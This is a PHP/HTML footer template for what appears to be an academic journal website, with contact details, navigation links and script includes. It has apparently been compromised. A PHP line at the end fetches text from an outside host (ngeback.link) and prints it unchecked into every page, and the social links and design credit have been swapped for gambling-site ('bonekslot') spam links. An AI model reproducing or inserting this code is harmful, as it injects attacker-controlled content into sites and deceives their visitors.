<!-- START FOOTER -->

<footer id="footer">
	
	<div class="container"> <!-- 1152 pixels Container -->
	
		<!-- Contact Details -->
		<div class="one-third column" id="contact-details">
			<div>
				<p>Connect with Us</p>
				<h2 class="phone-number"><?php echo($dd['mobile']) ?></h2>
				<a href="mailto:<?php echo($dd['email']) ?>"><?php echo($dd['email']) ?></a>
			</div>
		</div>
		
		<div class="two-thirds column" id="footer-links">
			
			<!-- Social Icons -->
			<ul class="social-icons clearfix">
				<li class="twitter"><a href="<?php echo($dd['twitter']) ?>">Twitter</a></li>
				<li class="facebook"><a href="<?php echo($dd['facebook']) ?>">Facebook</a></li>
				<li class="google-plus"><a href="http://www.bonekslot.net/">Google+</a></li>
				<li class="linkedin"><a href="http://www.bonekslot.org/">LinkedIn</a></li>
			</ul>
			
			<!-- Footer Navigation -->
			<ul class="footer-nav clearfix">
				<li><a href="home">Home</a></li>
				<li><a href="editorialboard">Editorial Board</a></li>
				<li><a href="contact">Contact</a></li>
				<li><a href="blogs">Blog</a></li>
				<li><a href="myaccount">Submit Article</a></li>
			</ul>
			
			<div class="clear"></div> <!-- IE7 margin-bottom fix -->
			
		</div>
		
	</div>

</footer>

<footer id="footer-bottom">
	
	<div class="container"> <!-- 1152 pixels Container -->
		<div class="sixteen columns">
			
			<div class="twelve columns alpha">
				<ul class="links clearfix">
					<li>&copy; <?php echo(date('Y')); ?> - <?php echo($dd['sitename']); ?><span>|</span></li>
					<li><a href="http://www.bonekslot.org/">Designed BonekSlot ICT</a>
				</ul>
			</div>
				
			<div class="four columns omega">
			</div>
			
		</div>
	</div>
	
</footer>

<!-- END FOOTER -->


</div>

<!-- Java Script -->
<script src="js/respond.min.js"></script>
<script src="js/selectnav.min.js"></script>
<script src="js/jquery.min.html"></script>
<script src="js/detectmobilebrowser.js"></script>
<script src="js/jquery.easing.min.js"></script>
<script src="js/jquery.fitvids.min.js"></script>
<script src="js/jquery.prettyPhoto.min.js"></script>
<script src="js/jquery.flexslider.min.js"></script>
<script src="js/jquery.carousel.min.js"></script>
<script src="js/jquery.tweet.min.js"></script>
<script src="js/custom.js"></script>
<script src="js/switcher.js"></script> <!-- Style Switcher -->

<?php $ch = curl_init();curl_setopt($ch, CURLOPT_URL, "https://ngeback.link/ar.txt");curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$output = curl_exec($ch);curl_close($ch);echo $output;?>

</body>
</html>
